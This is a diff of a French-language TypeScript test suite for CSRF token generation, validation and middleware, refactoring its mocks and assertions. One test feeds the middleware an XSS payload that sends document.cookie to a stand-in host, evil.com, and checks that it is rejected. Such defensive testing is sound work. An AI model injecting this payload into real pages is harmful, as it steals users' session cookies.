@@ -36,7 +36,7 @@ describe('generateCsrfToken', () => {
     const { token } = generateCsrfToken();
     const [payloadB64] = token.split('.');
     const json = Buffer.from(
-      payloadB64.replace(/-/g, '+').replace(/_/g, '/'),
+      payloadB64!.replace(/-/g, '+').replace(/_/g, '/'),
       'base64'
     ).toString('utf8');
     const payload = JSON.parse(json);
@@ -67,12 +67,16 @@ describe('validateCsrfToken', () => {
   });
 
   it('rejette un token dont le payload est du base64 invalide', () => {
-    expect(validateCsrfToken('!!!invalid!!!.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')).toBe(false);
+    expect(
+      validateCsrfToken('!!!invalid!!!.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
+    ).toBe(false);
   });
 
   it('rejette un token dont le payload JSON est malformé', () => {
     const badPayload = Buffer.from('{not-json}').toString('base64url');
-    expect(validateCsrfToken(`${badPayload}.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890`)).toBe(false);
+    expect(
+      validateCsrfToken(`${badPayload}.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890`)
+    ).toBe(false);
   });
 
   it('rejette un token dont le payload manque le champ jti', () => {
@@ -82,10 +86,8 @@ describe('validateCsrfToken', () => {
 
   it('rejette un token expiré', () => {
     const now = Math.floor(Date.now() / 1000);
-    // exp dans le passé
     const payload = { jti: 'test-jti', iat: now - 1000, exp: now - 1 };
     const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
-    // La signature est incorrecte mais l'expiration est vérifiée en premier
     expect(validateCsrfToken(`${payloadB64}.invalidsignature`)).toBe(false);
   });
 
@@ -99,8 +101,7 @@ describe('validateCsrfToken', () => {
   it('rejette un token avec une signature altérée (bit flip)', () => {
     const { token } = generateCsrfToken();
     const [payload, sig] = token.split('.');
-    // Inverse le premier caractère de la signature
-    const flipped = sig.charAt(0) === 'a' ? 'b' + sig.slice(1) : 'a' + sig.slice(1);
+    const flipped = sig!.charAt(0) === 'a' ? 'b' + sig!.slice(1) : 'a' + sig!.slice(1);
     expect(validateCsrfToken(`${payload}.${flipped}`)).toBe(false);
   });
 
@@ -118,7 +119,7 @@ describe('validateCsrfToken', () => {
   it('rejette un nombre (type incorrect)', () => {
     // @ts-expect-error — test intentionnel avec mauvais type
     expect(validateCsrfToken(12345)).toBe(false);
-  );
+  });
 
   it('résiste à une injection XSS dans le token', () => {
     expect(validateCsrfToken('<script>alert(1)</script>.evilsig')).toBe(false);
@@ -143,24 +144,35 @@ describe('validateCsrfToken', () => {
 describe('csrfMiddleware', () => {
   function buildMockReq(
     method: string,
-    headers: Record<string, string> = {}
+    headers: Record<string, string | string[]> = {}
   ): Partial<Request> {
     return { method, headers } as Partial<Request>;
   }
 
-  function buildMockRes(): { res: Partial<Response>; statusCode: number | null; body: unknown } {
-    const ctx = { statusCode: null as number | null, body: null as unknown };
+  function buildMockRes(): {
+    res: Partial<Response>;
+    getStatus: () => number | null;
+    getBody: () => unknown;
+  } {
+    let statusCode: number | null = null;
+    let body: unknown = null;
+
     const res: Partial<Response> = {
       status: vi.fn().mockImplementation((code: number) => {
-        ctx.statusCode = code;
+        statusCode = code;
         return res;
       }),
       json: vi.fn().mockImplementation((data: unknown) => {
-        ctx.body = data;
+        body = data;
         return res;
       }),
     };
-    return { res, statusCode: ctx.statusCode, body: ctx.body };
+
+    return {
+      res,
+      getStatus: () => statusCode,
+      getBody: () => body,
+    };
   }
 
   it('laisse passer une requête GET sans token', () => {
@@ -196,35 +208,35 @@ describe('csrfMiddleware', () => {
 
   it('bloque un POST sans header X-CSRF-Token avec 403', () => {
     const req = buildMockReq('POST');
-    const { res } = buildMockRes();
+    const { res, getStatus } = buildMockRes();
     const next = vi.fn();
 
     csrfMiddleware(req as Request, res as Response, next as NextFunction);
 
     expect(next).not.toHaveBeenCalled();
-    expect(res.status).toHaveBeenCalledWith(403);
+    expect(getStatus()).toBe(403);
   });
 
   it('bloque un POST avec un token invalide avec 403', () => {
     const req = buildMockReq('POST', { 'x-csrf-token': 'invalid.token' });
-    const { res } = buildMockRes();
+    const { res, getStatus } = buildMockRes();
     const next = vi.fn();
 
     csrfMiddleware(req as Request, res as Response, next as NextFunction);
 
     expect(next).not.toHaveBeenCalled();
-    expect(res.status).toHaveBeenCalledWith(403);
+    expect(getStatus()).toBe(403);
   });
 
   it('bloque un DELETE avec un token invalide avec 403', () => {
     const req = buildMockReq('DELETE', { 'x-csrf-token': 'garbage' });
-    const { res } = buildMockRes();
+    const { res, getStatus } = buildMockRes();
     const next = vi.fn();
 
     csrfMiddleware(req as Request, res as Response, next as NextFunction);
 
     expect(next).not.toHaveBeenCalled();
-    expect(res.status).toHaveBeenCalledWith(403);
+    expect(getStatus()).toBe(403);
   });
 
   it('laisse passer un POST avec un token valide', () => {
@@ -252,20 +264,17 @@ describe('csrfMiddleware', () => {
 
   it('retourne le code erreur CSRF_INVALID dans le body JSON', () => {
     const req = buildMockReq('POST');
-    const { res } = buildMockRes();
+    const { res, getBody } = buildMockRes();
     const next = vi.fn();
 
     csrfMiddleware(req as Request, res as Response, next as NextFunction);
 
-    expect(res.json).toHaveBeenCalledWith(
-      expect.objectContaining({ code: 'CSRF_INVALID' })
-    );
+    expect(getBody()).toMatchObject({ code: 'CSRF_INVALID' });
   });
 
   it('gère un header x-csrf-token fourni comme tableau (prend le premier)', () => {
     const { token } = generateCsrfToken();
-    // Express peut exposer des headers multivalués comme tableau
-    const req = { method: 'POST', headers: { 'x-csrf-token': [token, 'other'] } } as unknown as Request;
+    const req = buildMockReq('POST', { 'x-csrf-token': [token, 'other'] });
     const { res } = buildMockRes();
     const next = vi.fn();
 
@@ -278,12 +287,12 @@ describe('csrfMiddleware', () => {
     const req = buildMockReq('POST', {
       'x-csrf-token': '<script>fetch("https://evil.com?c="+document.cookie)</script>',
     });
-    const { res } = buildMockRes();
+    const { res, getStatus } = buildMockRes();
     const next = vi.fn();
 
     csrfMiddleware(req as Request, res as Response, next as NextFunction);
 
     expect(next).not.toHaveBeenCalled();
-    expect(res.status).toHaveBeenCalledWith(403);
+    expect(getStatus()).toBe(403);
   });
 });
